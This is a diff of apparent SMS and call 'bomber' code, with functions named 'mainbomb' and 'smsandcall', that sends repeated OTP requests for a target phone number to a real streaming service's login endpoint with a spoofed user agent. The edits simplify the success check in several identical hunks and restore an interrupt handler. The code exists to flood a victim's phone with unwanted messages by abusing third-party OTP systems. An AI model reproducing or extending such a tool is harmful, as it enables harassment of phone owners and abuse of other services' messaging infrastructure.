@@ -1025,11 +1025,11 @@ def mainbomb(maothreat,maocc,maonumber,ccn):
         else:
           pass
         bioscope=rpm('https://stage.bioscopelive.com/en/login/send-otp?phone='+maonumber2+'&operator=bd-otp',headers={"User-Agent":maoagents})
-        maobioscope=bioscope.text
-        maobioscope=json.loads(maobioscope)
-        maobioscope =maobioscope.get("messsage")
-        maobioscope =maobioscope=="SUCCESS"
-        if bioscope.status_code==200 or maobioscope: 
+       #
+        ###
+        ###
+        ###
+        if bioscope.status_code==200  : 
           osc("clear")
           print(logomao)
           print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
@@ -1424,11 +1424,11 @@ def mainbomb(maothreat,maocc,maonumber,ccn):
         else:
           pass
         bioscope=rpm('https://stage.bioscopelive.com/en/login/send-otp?phone='+maonumber2+'&operator=bd-otp',headers={"User-Agent":maoagents})
-        maobioscope=bioscope.text
-        maobioscope=json.loads(maobioscope)
-        maobioscope =maobioscope.get("messsage")
-        maobioscope =maobioscope=="SUCCESS"
-        if bioscope.status_code==200 or maobioscope: 
+       #
+        ###
+        ###
+        ###
+        if bioscope.status_code==200  : 
           osc("clear")
           print(logomao)
           print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
@@ -1904,11 +1904,11 @@ def mainbomb(maothreat,maocc,maonumber,ccn):
         else:
           pass
         bioscope=rpm('https://stage.bioscopelive.com/en/login/send-otp?phone='+maonumber2+'&operator=bd-otp',headers={"User-Agent":maoagents})
-        maobioscope=bioscope.text
-        maobioscope=json.loads(maobioscope)
-        maobioscope =maobioscope.get("messsage")
-        maobioscope =maobioscope=="SUCCESS"
-        if bioscope.status_code==200 or maobioscope: 
+       #
+        ###
+        ###
+        ###
+        if bioscope.status_code==200  : 
           osc("clear")
           print(logomao)
           print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
@@ -3158,11 +3158,11 @@ def smsandcall(maothreat,maocc,maonumber,ccn):
         else:
           pass
         bioscope=rpm('https://stage.bioscopelive.com/en/login/send-otp?phone='+maonumber2+'&operator=bd-otp',headers={"User-Agent":maoagents})
-        maobioscope=bioscope.text
-        maobioscope=json.loads(maobioscope)
-        maobioscope =maobioscope.get("messsage")
-        maobioscope =maobioscope=="SUCCESS"
-        if bioscope.status_code==200 or maobioscope: 
+       #
+        ###
+        ###
+        ###
+        if bioscope.status_code==200  : 
           osc("clear")
           print(logomao)
           print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
@@ -3551,11 +3551,11 @@ def smsandcall(maothreat,maocc,maonumber,ccn):
         else:
           pass
         bioscope=rpm('https://stage.bioscopelive.com/en/login/send-otp?phone='+maonumber2+'&operator=bd-otp',headers={"User-Agent":maoagents})
-        maobioscope=bioscope.text
-        maobioscope=json.loads(maobioscope)
-        maobioscope =maobioscope.get("messsage")
-        maobioscope =maobioscope=="SUCCESS"
-        if bioscope.status_code==200 or maobioscope: 
+       #
+        ###
+        ###
+        ###
+        if bioscope.status_code==200  : 
           osc("clear")
           print(logomao)
           print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
@@ -4032,11 +4032,11 @@ def smsandcall(maothreat,maocc,maonumber,ccn):
         else:
           pass
         bioscope=rpm('https://stage.bioscopelive.com/en/login/send-otp?phone='+maonumber2+'&operator=bd-otp',headers={"User-Agent":maoagents})
-        maobioscope=bioscope.text
-        maobioscope=json.loads(maobioscope)
-        maobioscope =maobioscope.get("messsage")
-        maobioscope =maobioscope=="SUCCESS"
-        if bioscope.status_code==200 or maobioscope: 
+       #
+        ###
+        ###
+        ###
+        if bioscope.status_code==200  : 
           osc("clear")
           print(logomao)
           print(f"{acl}_______________________________{gcl}MAO{acl}______________________________\n")
@@ -4256,9 +4256,9 @@ def smsandcall(maothreat,maocc,maonumber,ccn):
         else:
           pass
         
-  #except KeyboardInterrupt:
-    #time.sleep(0.3)
-    #exit(f"\n{acl}[{rcl} !{acl} ]{rcl} ABORTING... {acl}[{rcl} !{acl} ]\n")
-    #time.sleep(0.09)
+  except KeyboardInterrupt:
+    time.sleep(0.3)
+    exit(f"\n{acl}[{rcl} !{acl} ]{rcl} ABORTING... {acl}[{rcl} !{acl} ]\n")
+    time.sleep(0.09)
   #except:
       #pass
